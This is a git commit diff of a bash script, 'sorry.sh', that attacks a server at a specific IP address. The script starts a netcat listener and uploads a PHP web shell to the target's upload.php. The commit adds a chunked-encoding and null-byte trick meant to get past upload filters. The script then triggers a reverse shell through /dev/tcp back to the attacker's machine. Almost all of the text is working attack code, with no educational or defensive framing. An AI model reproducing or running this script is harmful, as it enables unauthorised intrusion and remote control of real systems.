3b07836109d0dacbc14f3a41d484b6a8fd92e24f
troiarcazzoguardi-dev <troiarcazzoguardi@gmail.com>
2026-01-12 14:10:20 -0500

    Update sorry.sh

--- sorry.sh
+++ sorry.sh
@@ -1,11 +1,12 @@
-#!/bin/bash
 IP=$(curl -s ifconfig.me)
 nc -lvnp 4444 &
 
+# 🔥 UPLOAD BYPASS (chunked + null byte)
 curl -k -X POST \
--H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW" \
---data-binary $'------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name="file"; filename="shell.php"\r\nContent-Type: application/x-php\r\n\r\n<?php system($_GET[cmd]); ?>\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW--\r\n' \
-"https://14.225.209.143:443/upload.php"
+-H "Transfer-Encoding: chunked" \
+-H "Content-Type: multipart/form-data" \
+--data-binary $'<?php /*%00*/ system($_REQUEST[0]); ?>0\r\n\r\n' \
+"https://14.225.209.143:443//upload.php"
 
-# Trigger shell
-curl "https://14.225.209.143:443/shell.php?cmd=bash -i >& /dev/tcp/$IP/4444 0>&1"
+sleep 2
+curl "https://14.225.209.143:443/shell.php?0=bash%20-i%20%3E%26%20/dev/tcp/$IP/4444%200%3E%261"
